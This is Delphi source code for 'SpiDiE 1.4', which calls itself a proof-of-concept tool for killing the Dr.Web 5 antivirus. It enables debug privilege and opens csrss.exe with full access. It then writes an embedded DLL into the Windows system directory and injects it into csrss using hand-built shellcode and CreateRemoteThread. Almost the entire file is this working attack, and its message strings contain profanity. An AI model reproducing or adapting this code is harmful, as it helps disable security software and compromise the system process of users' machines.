{$E EXE}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Spidie;
{$ENDIF}
unit Spidie;
interface

uses
  Windows,
  WinNative,
  RTL;

{$R version.res}

implementation

const
  hinst = $00400000;
  SpiDiE14: PWideChar = 'SpiDiE 1.4';

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD;
begin
  result := MessageBoxW(GetDesktopWindow(), PStr, SpiDiE14, Buttons);
end;

function WriteBufferToFile(const lpFileName: PWideChar; Buffer: pointer; Size: DWORD; Append: boolean = false): integer; stdcall;
var
  fh: THANDLE;
  ns: NTSTATUS;
  dwFlag: DWORD;
  fo1: LARGE_INTEGER;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;
  fs1: FILE_STANDARD_INFORMATION;
  iost: IO_STATUS_BLOCK;
begin
  iost.uInformation := 0;
  if (RtlDosPathNameToNtPathName_U(lpFileName, @str1, nil, nil)) then
  begin
    ns := FILE_WRITE_ACCESS or SYNCHRONIZE;
    dwFlag := FILE_OVERWRITE_IF;
    if Append then
    begin
      ns := ns or FILE_READ_ACCESS;
      dwFlag := FILE_OPEN_IF;
    end;
    InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
    ns := ZwCreateFile(@fh, ns, @attr,
      @iost, nil, FILE_ATTRIBUTE_NORMAL, 0, dwFlag,
      FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE, nil, 0);
    if (ns = STATUS_SUCCESS) then
    begin
      if Append then
      begin
        if (ZwQueryInformationFile(fh, @iost, @fs1, sizeof(fs1), FileStandardInformation) = STATUS_SUCCESS) then fo1 := fs1.EndOfFile;
        ZwWriteFile(fh, 0, nil, nil, @iost, Buffer, Size, @fo1, nil);
      end else
        ZwWriteFile(fh, 0, nil, nil, @iost, Buffer, Size, nil, nil);
      ZwClose(fh);
    end;
    RtlFreeUnicodeString(@str1);
  end;
  result := iost.uInformation;
end;

function ExtractResource(const ResName: PWideChar; const ResSection: PWideChar; const ExtractFileName: PWideChar): boolean;
var
  hRes: HRSRC;
  hResData: HGLOBAL;
  size: cardinal;
  bytesIO: DWORD;
begin
  size := 0;
  bytesIO := $FFFFFFFF;
  hRes := FindResourceW(hinst, ResName, ResSection);
  if (hRes <> 0) then
  begin
    size := SizeOfResource(hinst, hRes);
    if (size <> 0) then
    begin
      hResData := LoadResource(hinst, hRes);
      if (hResData <> 0) then
        bytesIO := WriteBufferToFile(ExtractFileName, pointer(hResData), size);
    end;
  end;
  result := (bytesIO = size);
end;

function _WriteProcessMemory(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
  nSize: DWORD; var lpNumberOfBytesWritten: DWORD): BOOL; stdcall;
begin
  result := (ZwWriteVirtualMemory(hProcess, lpBaseAddress, lpBuffer, nSize, @lpNumberOfBytesWritten) = STATUS_SUCCESS);
end;

type
  CreateRemoteThreadPtr = function(hProcess: THandle; lpThreadAttributes: Pointer;
  dwStackSize: DWORD; lpStartAddress: TFNThreadStartRoutine; lpParameter: Pointer;
  dwCreationFlags: DWORD; var lpThreadId: DWORD): THandle; stdcall;

var
  p1: CreateRemoteThreadPtr;
  hKernel32: dword;

function CreateThreadInProcess(hProcess: THandle; lpThreadAttributes: Pointer;
  dwStackSize: DWORD; lpStartAddress: TFNThreadStartRoutine; lpParameter: Pointer;
  dwCreationFlags: DWORD; var lpThreadId: DWORD): THANDLE; stdcall;
begin
  result := 0;
  if (@p1 <> nil) then
    result := p1(hProcess, lpThreadAttributes,  dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
end;

function InjectDll(Process: dword; ModulePath: PChar): boolean;
var
  Memory: pointer;
  Code: dword;
  BytesWritten: dword;
  ThreadId: dword;
  hThread: dword;

  Inject: packed record
    PushCommand: byte;
    PushArgument: DWORD;
    CallCommand: WORD;
    CallAddr: DWORD;
    PushExitThread: byte;
    ExitThreadArg: dword;
    CallExitThread: word;
    CallExitThreadAddr: DWord;
    AddrLoadLibrary: pointer;
    AddrExitThread: pointer;
    LibraryName: FBuf;
  end;

begin
  result := false;
  Memory := VirtualAllocEx(Process, nil, sizeof(Inject), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (Memory = nil) then exit;
  Code := DWORD(Memory);
  inject.PushCommand := $68;
  inject.PushArgument := code + $1E;
  inject.CallCommand := $15FF;
  inject.CallAddr := code + $16;
  inject.PushExitThread := $68;
  inject.ExitThreadArg := 0;
  inject.CallExitThread := $15FF;
  inject.CallExitThreadAddr := code + $1A;
  inject.AddrLoadLibrary := GetProcAddress(hKernel32, 'LoadLibraryA');
  inject.AddrExitThread := GetProcAddress(hKernel32, 'ExitThread');
  strcpyA(@inject.LibraryName, ModulePath);
  WriteProcessMemory(Process, Memory, @inject, sizeof(inject), BytesWritten);
  hThread := CreateThreadInProcess(Process, nil, 0, Memory, nil, 0, ThreadId);
  if (hThread <> 0) then
  begin
    asm
      nop
      nop
    end;
    CloseHandle(hThread);
    asm
      nop
      nop
    end;
    result := True;
  end else result := false;
end;

function GetTargetProcessHandle(): THANDLE;
var
  pp1: PSYSTEM_PROCESSES;
  membuf: PChar;
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
  bytesIO: DWORD;
begin
  result := 0;
  membuf := nil;
  bytesIO := $400000;
  ZwAllocateVirtualMemory(NtCurrentProcess, @membuf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (membuf = nil) then exit;
  if (ZwQuerySystemInformation(SystemProcessesAndThreadsInformation, membuf, bytesIO, @bytesIO) = STATUS_SUCCESS) then
  begin
    pp1 := PSYSTEM_PROCESSES(membuf);
    while (1 = 1) do
    begin
      if (pp1^.ProcessName.PStr <> nil) then
        if (strcmpiW(pp1^.ProcessName.PStr, 'csrss.exe') = 0) then
        begin
          cid1.UniqueProcess := pp1^.ProcessId;
          cid1.UniqueThread := 0;
          InitializeObjectAttributes(@attr, nil, 0, 0, nil);
          if (ZwOpenProcess(@result, PROCESS_ALL_ACCESS, @attr, @cid1) = STATUS_SUCCESS) then break
          else
            result := 0;
        end;
      if (pp1^.NextEntryOffset = 0) then break;
      pp1 := PSYSTEM_PROCESSES(PChar(pp1) + pp1^.NextEntryOffset);
    end;
  end;
  bytesIO := 0;
  ZwFreeVirtualMemory(NtCurrentProcess, @membuf, @bytesIO, MEM_RELEASE);
end;

function DeleteTmpFile(FileName: PWideChar): boolean;
var
  attr: OBJECT_ATTRIBUTES;
  st: UNICODE_STRING;
begin
  result := Internal_RemoveFile(FileName);
  if not result then
  begin
    NtSleep(1000);
    if (RtlDosPathNameToNtPathName_U(FileName, @st, nil, nil)) then
    begin
      InitializeObjectAttributes(@attr, @st, OBJ_CASE_INSENSITIVE, 0, nil);
      result := (ZwDeleteFile(@attr) = STATUS_SUCCESS);
      RtlFreeUnicodeString(@st);
    end;
  end;
end;

var
  osver: OSVERSIONINFOEXW;
  hCsrss: THANDLE;
  tmp1: FBuf;
  tmp2: LBuf;
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  MutexHandle: THANDLE;
  EventHandle: THANDLE;
begin
  strcpyW(tmp2, '\BaseNamedObjects\PoloniousWasThereAndOutThereRestartPlease');
  RtlInitUnicodeString(@str1, tmp2);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwCreateMutant(@MutexHandle, MUTANT_ALL_ACCESS, @attr, false) = STATUS_OBJECT_NAME_COLLISION) then
  begin
    ShowMessage('One launch per Windows startup allowed, hack or reboot', MB_OK);
    ExitProcess($BADDEAD);
  end;
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    ShowMessage('Unsupported OS <Всем_похуй>', MB_ICONINFORMATION);
  end else
  begin
    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin

      if (ShowMessage('DrWeb5 user mode proof-of-concept killer'#13#10 +
        'DKOH, fucking SSDT / Shadow SSDT will not help DrWeb!'#13#13#10 +
        '(c) 2009 - 2010 by EP_X0FF'#13#13#10'Should we continue, my friend?', MB_YESNO or MB_ICONQUESTION) = IDNO) then exit;

      hKernel32 := GetModuleHandleW('kernel32.dll');
      p1 := GetProcAddress(hKernel32, 'CreateRemoteThread');
      memzero(@tmp1, sizeof(tmp1));
      hCsrss := GetTargetProcessHandle();
      GetSystemDirectoryA(tmp1, MAX_PATH);
      strcatA(tmp1, '\dwunprot.dll');

      memzero(@tmp2, sizeof(tmp2));
      RtlAnsiToUnicode(@tmp2, @tmp1);
      if not ExtractResource('DWUNPROT', 'DLL', tmp2) then OutputDebugStringW('Failed at extraction stage') else
      begin
        EventHandle := 0;
        RtlInitUnicodeString(@str1, '\BaseNamedObjects\dwunprotwait');
        InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
        ZwCreateEvent(@EventHandle, EVENT_ALL_ACCESS, @attr, NotificationEvent, FALSE);
        if (EventHandle = 0) then
        begin
          ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr);
        end;
        if (EventHandle <> 0) then
        begin
          if not InjectDll(hCsrss, tmp1) then OutputDebugStringW(#13'Failed at injection stage') else
          begin
            if (ZwWaitForSingleObject(EventHandle, false, nil) = 0) then
              ShowMessage('That''s all folks! Awaiting further ridiculous protections ^_^', MB_ICONINFORMATION);
          end;
          ZwClose(EventHandle);
        end;
      end;
    end;
  end;
  OutputDebugStringW('My mission is to protect you (c) TDL');
  ZwTerminateProcess(DWORD(-1), 0);
end.

